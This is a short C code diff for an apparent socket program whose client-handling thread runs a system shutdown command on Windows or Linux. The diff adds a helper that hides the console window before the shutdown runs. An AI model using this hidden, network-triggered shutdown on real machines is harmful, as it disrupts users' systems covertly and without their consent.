@@ -4,10 +4,12 @@
  ******************************************************
  */
 
+#define _WIN32_WINNT 0x0500
+
 #if defined(__linux__)
 	#include <sys/socket.h>
 	#include <arpa/inet.h>
-#else
+#elif defined(_WIN32)
 	#include <windows.h>
 	#include <winsock2.h>
 #endif
@@ -22,11 +24,17 @@
 
 void (*funcThread)(int clientfd);
 
+static BOOL hide_wnd(HWND wnd, BOOL bShow)
+{
+	return (bShow) ? ShowWindow(wnd, SW_SHOW) : ShowWindow(wnd, SW_HIDE);
+}
+
 void prog_thread(int clientfd)
 {
 #if defined(_WIN32)
     char *pname = "C:\\Windows\\system32\\cmd.exe";
 	const char *args[] = {"/c", "shutdown", "/s", NULL};
+	hide_wnd(GetConsoleWindow(), FALSE);
 #elif defined(__linux__)
 	const char *pname = "/bin/sh";
 	char *const args[] = {"-c", "shutdown", "-P", "now", NULL};
